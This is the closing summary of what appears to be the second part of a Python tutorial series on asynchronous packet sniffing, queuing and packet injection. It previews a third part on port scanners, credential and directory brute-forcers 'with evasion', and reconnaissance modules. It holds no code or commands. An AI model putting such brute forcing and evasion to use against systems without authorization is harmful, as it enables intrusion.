```

## Part 2 Summary

### What You've Built

Congratulations! In Part 2, you've built a complete asynchronous packet processing system:

1. **Event Loop Manager** - Centralized async event management with task scheduling
2. **Async Packet Sniffer** - High-performance non-blocking packet capture
3. **Queue Management** - Advanced queues with backpressure and priority
4. **Packet Injection** - Event-driven packet injection with timing control

### Key Architecture Decisions

| Component | Purpose |
|-----------|---------|
| **Event Loop** | Centralizes async operations and provides thread-safe task submission |
| **AsyncSniffer** | Non-blocking capture with background threads and async queues |
| **Backpressure** | Prevents memory exhaustion in high-volume environments |
| **Ring Buffer** | High-performance fixed-size buffer with O(1) operations |
| **Packet Injection** | Precise timing and trigger-based packet sending |

### Performance Features

- **Zero-copy** packet handling with `store=False`
- **Thread-safe** queue operations
- **Backpressure** to prevent resource exhaustion
- **Priority queuing** for critical packets
- **Rate limiting** for controlled operations

### Preview: Part 3

In Part 3, we'll build on this foundation to create:
- **Async scanners** - Fast port scanning with asyncio
- **Brute-forcers** - Credential and directory brute forcing with evasion
- **DOM analysis** - JavaScript-heavy application scraping
- **Modular recon** - Pluggable reconnaissance modules

The foundation is laid—now we build the reconnaissance tools!

